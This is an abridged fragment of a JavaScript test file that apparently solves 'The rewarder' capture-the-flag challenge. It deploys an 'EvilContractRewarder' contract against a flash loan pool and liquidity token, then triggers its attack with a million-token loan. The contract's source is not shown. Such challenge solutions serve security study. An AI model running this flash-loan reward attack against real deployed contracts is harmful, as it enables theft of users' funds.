...
describe("[Challenge] The rewarder", function () {
	...
	it("Exploit", async function () {
		...
		const EvilContractRewarder = await ethers.getContractFactory(
			"EvilContractRewarder",
			attacker
		);
		this.evil = await EvilContractRewarder.deploy(
			this.flashLoanPool.address,
			this.liquidityToken.address,
		...
		await this.evil
			.connect(attacker)
			.attack(ethers.utils.parseEther("1000000"));
